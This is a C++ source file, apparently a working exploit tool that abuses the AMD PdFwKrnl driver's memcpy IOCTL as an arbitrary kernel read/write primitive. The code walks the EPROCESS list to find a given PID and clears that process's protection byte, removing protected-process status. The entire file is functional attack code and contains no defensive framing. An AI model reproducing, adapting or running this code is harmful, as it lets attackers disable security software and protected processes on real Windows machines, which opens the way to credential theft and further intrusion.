#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// --- AMD PDFW (PdFwKrnl) Specifics ---
#define IOCTL_AMDPDFW_MEMCPY 0x80002014

// This structure MUST be exactly 48 bytes
typedef struct _PDFW_MEMCPY {
    BYTE  Reserved[16];   // 0x00 - 0x0F
    PVOID Destination;    // 0x10
    PVOID Source;         // 0x18
    PVOID Reserved2;      // 0x20
    DWORD Size;           // 0x28
    DWORD Reserved3;      // 0x2C
} PDFW_MEMCPY, * PPDFW_MEMCPY;

struct KernelOffsets {
    ULONG64 UniqueProcessIdOffset = 0x1D0;
    ULONG64 ActiveProcessLinksOffset = 0x1D8;
    ULONG64 ImageFileNameOffset = 0x338;
    ULONG64 ProtectionOffset = 0x5FA; // Offset for Build 26200
};

HANDLE hDriver = INVALID_HANDLE_VALUE;
KernelOffsets Offsets;

// --- AMD PDFW Communication Primitives ---

bool Amd_ReadMemory(DWORD64 Address, PVOID Buffer, DWORD Size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;           
    request.Source = (PVOID)Address;        
    request.Size = Size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, IOCTL_AMDPDFW_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

bool Amd_WriteMemory(DWORD64 Address, PVOID Buffer, DWORD Size) {
    PDFW_MEMCPY request;
    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;   
    request.Source = Buffer;                
    request.Size = Size;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, IOCTL_AMDPDFW_MEMCPY, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
}

DWORD64 ReadMemoryDWORD64(DWORD64 Address) {
    DWORD64 val = 0;
    if (Amd_ReadMemory(Address, &val, 8)) return val;
    return 0;
}


ULONG64 GetSystemEproc(ULONG64 ntosBase) {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    DWORD64 addrInLocal = (DWORD64)GetProcAddress(ntos, "PsInitialSystemProcess");
    DWORD64 offset = addrInLocal - (DWORD64)ntos;
    FreeLibrary(ntos);

    std::cout << "[*] PsInitialSystemProcess Offset: 0x" << std::hex << offset << std::endl;
    return ReadMemoryDWORD64(ntosBase + offset);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <Target PID>" << std::endl;
        return 1;
    }
    DWORD targetPid = std::stoul(argv[1]);

    hDriver = CreateFileW(L"\\\\.\\Global\\PdFwKrnl", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open handle to PdFwKrnl. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Connected to AMD PDFW Driver." << std::endl;

    // Get Kernel Base
    ULONG64 ntosBase = 0;
    LPVOID drivers[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) ntosBase = (ULONG64)drivers[0];
    std::cout << "[*] ntoskrnl.exe Base: 0x" << std::hex << ntosBase << std::endl;

    ULONG64 systemEproc = GetSystemEproc(ntosBase);
    if (!systemEproc) {
        std::cerr << "[-] Failed to read System EPROCESS. Communication failed." << std::endl;
        return 1;
    }
    std::cout << "[+] System EPROCESS: 0x" << std::hex << systemEproc << std::endl;

    // Iterate Process List
    DWORD64 listHead = systemEproc + Offsets.ActiveProcessLinksOffset;
    DWORD64 currentFlink = ReadMemoryDWORD64(listHead);
    bool found = false;

    while (currentFlink != listHead && currentFlink != 0) {
        DWORD64 currentEproc = currentFlink - Offsets.ActiveProcessLinksOffset;
        DWORD64 pid = ReadMemoryDWORD64(currentEproc + Offsets.UniqueProcessIdOffset);

        if (pid == targetPid) {
            char name[16] = { 0 };
            BYTE prot = 0;
            Amd_ReadMemory(currentEproc + Offsets.ImageFileNameOffset, name, 15);
            Amd_ReadMemory(currentEproc + Offsets.ProtectionOffset, &prot, 1);

            std::cout << "[+] Found Target: " << name << std::endl;
            std::cout << "[*] Current Protection: 0x" << (int)prot << std::endl;

            // ACTION: Clear Protection
            BYTE zero = 0;
            if (Amd_WriteMemory(currentEproc + Offsets.ProtectionOffset, &zero, 1)) {
                std::cout << "[!!!] SUCCESS: Protection byte cleared." << std::endl;
            }
            found = true;
            break;
        }
        currentFlink = ReadMemoryDWORD64(currentEproc + Offsets.ActiveProcessLinksOffset);
    }

    if (!found) std::cout << "[-] PID not found." << std::endl;

    CloseHandle(hDriver);
    return 0;
}